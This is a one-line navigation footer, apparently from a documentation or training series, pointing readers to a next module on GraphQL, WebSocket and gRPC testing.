**Next Module:** casperpro-api-advanced.md for GraphQL, WebSocket, and gRPC testing
